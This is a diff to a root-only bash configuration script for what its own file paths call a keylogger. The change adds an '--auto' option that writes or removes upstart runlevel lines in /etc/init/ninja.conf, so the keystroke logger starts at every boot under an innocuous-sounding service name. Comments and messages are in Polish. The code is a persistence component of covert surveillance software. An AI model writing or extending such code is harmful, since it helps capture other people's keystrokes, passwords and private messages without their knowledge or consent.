@@ -1,6 +1,11 @@
 #!/bin/bash
 
 FILEPATH="/etc/keylogger.conf"
+FILEPATHINIT="/etc/init/ninja.conf"
+STARTCONF="start on runlevel [2345]"
+STOPCONF="stop on runlevel [016]"
+STARTNUMBER=2345
+STOPNUMBER='016'
 
 if [ "$(whoami)" != "root" ] 
 then
@@ -48,7 +53,25 @@ do
 		"--auto") 
 			if [ $1 = "false" -o $1 = "true" ]
 			then
+
+				if [ $1 = "false" ]
+				then 
+					if (grep -Fxq auto=true $FILEPATH)
+					then
+					echo "siema"
+					sed -i 's/start on runlevel \[2345\]//g' $FILEPATHINIT
+					sed -i 's/stop on runlevel \[016\]//g' $FILEPATHINIT
+					fi
+				else
+					if (grep -Fxq auto=false $FILEPATH)
+					then
+					echo $STARTCONF >> $FILEPATHINIT
+					echo $STOPCONF >> $FILEPATHINIT
+					fi
+				fi
 				sed -i '1c\'"auto=$1" $FILEPATH
+					
+				
 			else
 				echo "Niepoprawny argument dla --auto!"
 				exit
